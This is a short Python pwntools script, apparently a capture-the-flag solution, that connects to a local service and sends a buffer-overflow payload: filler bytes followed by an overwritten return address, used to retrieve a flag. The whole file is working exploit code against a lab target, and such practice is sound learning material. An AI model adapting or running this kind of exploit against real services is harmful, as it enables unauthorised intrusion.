from pwn import * # pip3 install pwn

# Open up connection.
address = 'localhost'
port = 3000
tcpsocket = remote(address, port)

# Receive server input request
print((tcpsocket.recvuntil('\n'.encode('latin-1'))).decode('latin-1'))

# Define payload
payload = "AAA%AAsAABAA-AA(AADAA;AA)AAEAAaAA0AAFAAb\x8d\x1d\x40"

# Encode and send payload
tcpsocket.sendline(payload.encode('latin-1'))
print ('Sent: 0x' + binascii.hexlify(payload.encode('latin-1')).decode('latin-1')
)

# Receive flag
print((tcpsocket.recvline()).decode('latin-1')) # Receive line after string is entered
print((tcpsocket.recv()).decode('latin-1')) # Receive the flag